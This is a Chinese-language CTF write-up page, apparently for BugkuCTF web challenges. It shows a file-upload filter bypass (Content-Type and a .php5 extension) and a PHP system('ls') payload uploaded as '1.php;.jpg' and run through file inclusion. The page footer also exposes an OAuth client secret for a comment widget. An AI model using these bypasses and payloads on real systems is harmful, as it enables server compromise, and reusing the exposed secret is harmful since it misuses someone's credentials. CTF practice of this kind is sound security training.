打开一看还以为题目挂了 然而看下http 是200<br />
- 看下源码啥也没有 好久没扫了 发现有robots.txt</p>
<div class="hlcode"><pre><span class="n">User</span><span class="o">-</span><span class="n">agent</span><span class="o">:</span> <span class="o">*</span>
<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">resusl</span><span class="p">.</span><span class="n">php</span>
</pre></div>


<ul>
<li>访问resusl.php 提示<code>if ($_GET[x]==$password) 此处省略1w字</code></li>
<li>结合admin提示？<code>?x=admin</code>成功了？？</li>
<li>flag(ctf_0098_lkji-s)</li>
</ul>
<h2 id="getshell">求getshell</h2>
<p>题目很明显 打开显示<code>My name is margin,give me a image file not a php</code><br />
可以上传文件 不让我上传php？我偏不<br />
- 抓包 上传一个1.php<br />
- Content-Type的multipart/form-data 任意字符改成大写绕过 <br />
- Content-Type改成image/jpg<br />
- filename=1.php5<br />
- go可拿到key<br />
- KEY{bb35dc123820e}</p>
<h2 id="insert-into">INSERT INTO注入</h2>
<h2 id="_20">这是一个神奇的登陆框</h2>
<h2 id="_21">多次</h2>
<h2 id="php_encrypt_1isccctf">PHP_encrypt_1(ISCCCTF)</h2>
<h2 id="2">文件包含2</h2>
<p>hint：文件包含<br />
- 看源码发现upload.php  <code>file=upload.php</code><br />
- 可以上传文件 显示请上传jpgpnggif格式文件<br />
- 构造文件 打印出目录文件名</p>
<div class="hlcode"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="nx">php</span><span class="o">&gt;</span><span class="nx">system</span><span class="p">(</span><span class="s2">&quot;ls&quot;</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</pre></div>


<p>保存为<code>1.php;.jpg</code> 上传成功<br />
- 根据网页显示访问 ?file=upload/201908230711481901.jpg<br />
- 显示<code>about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php</code><br />
- 看到txt文件访问<code>http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt</code>得出key<br />
- SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p>
</div>
<div id="content-footer">created in <span class="create-date date"> 2019-05-05 01:01 </span></div>
<div id="comments"></div>
<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script type="text/javascript">
const gitment = new Gitment({
  id: '<%= page.date %>',
  title: 'BugkuCTF-WEB-WriteUp',
  owner: '2kkkkk',
  repo: 'wiki',
  oauth: {
    client_id: '3e94faa97d38ef7da223',
    client_secret: '20685c8a4da0dfad1c1ae91970b7805e260c5abb',
  },
  // ...
  // For more available options, check out the documentation below
})
gitment.render('comments')
// or
// gitment.render(document.getElementById('comments'))
// or
// document.body.appendChild(gitment.render())
</script>

</div>
<div id="footer">
            <span>
                Copyright © 2019 Curtails.
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
                Fork me in <a href="" target="_blank"> github </a>.
            </span>
</div>


<!--百度统计-->
<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>


</body>
</html>